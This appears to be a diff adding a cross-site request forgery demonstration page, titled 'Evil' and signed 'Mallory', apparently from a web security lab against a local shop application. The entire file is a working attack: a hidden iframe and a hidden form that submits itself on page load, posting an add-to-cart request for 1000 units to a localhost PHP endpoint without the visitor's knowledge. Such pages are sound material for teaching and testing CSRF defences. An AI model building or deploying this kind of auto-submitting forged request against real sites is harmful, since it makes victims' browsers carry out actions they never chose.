@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8">
+		<title>Evil</title>
+	</head>
+	<body>
+		<h1>Hi, my name is Mallory!</h1>
+		<iframe style="display:none" name="atk-frame"></iframe>
+		<form method="POST" action="http://localhost:80/php/addToCart.php" target="atk-frame" id="atk-form">
+			<input type="hidden" name="id" value="1">
+			<input type="hidden" name="amount" value="1000">
+			<input type="hidden" value="submit">
+		</form>
+		<script>
+			document.getElementById("atk-form").submit()
+		</script>
+
+	</body>
+</html>
+
